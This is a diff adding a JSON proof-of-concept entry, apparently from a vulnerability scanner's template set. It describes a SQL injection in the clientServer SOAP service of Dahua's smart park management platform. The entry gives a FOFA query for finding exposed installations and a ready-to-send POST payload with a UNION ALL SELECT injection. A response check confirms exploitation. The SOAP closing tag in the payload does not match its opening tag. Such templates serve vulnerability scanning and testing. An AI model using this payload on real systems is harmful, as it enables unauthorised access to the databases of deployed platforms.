@@ -1,0 +1,39 @@
+{
+  "product": "大华智慧园区综合管理平台",
+  "vul_name": "大华智慧园区综合管理平台 clientServer 存在SQL注入",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "大华智慧园区综合管理平台是一款综合管理平台，具备园区运营、资源调配和智能服务等功能。平台意在协助优化园区资源分配，满足多元化的管理需求，同时通过提供智能服务，增强使用体验。portal/services/clientServer存在SQL注入。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"dahua-智慧园区综合管理平台\""
+  },
+  "protocol": "http",
+  "link": "https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485829&idx=1&sn=16d23e7e11cc7cff1fbfd11f000a80f3&chksm=974b8482a03c0d94799dd4a06ef8ad5484b129844b8e68b2db2a538bdc0cb1c44bbc8e893659&scene=178&cur_album_id=2873032428486115330#rd",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/portal/services/clientServer",
+      "header": {
+        "Content-Type": "text/xml;charset=UTF-8"
+      },
+      "data": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:cli=\"http://clientServer.webservice.dssc.dahua.com\">\n  <soapenv:Header/>\n  <soapenv:Body>\n  <cli:getGroupInfoListByGroupId>\n    <!--type: string-->\n      <arg0>-5398) UNION ALL SELECT 5336,5336,5336,5336,md5(123456)-- -</arg0>\n    <!--type: long-->\n    <arg1>10</arg1>\n    </cli:getGroupInfoListByGroupId>\n    </soapenv:Body>\n  </soap:Envelope>"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "e10adc3949ba59abbe56e057f20f883e"
+        }
+      ]
+    }
+  }
+}
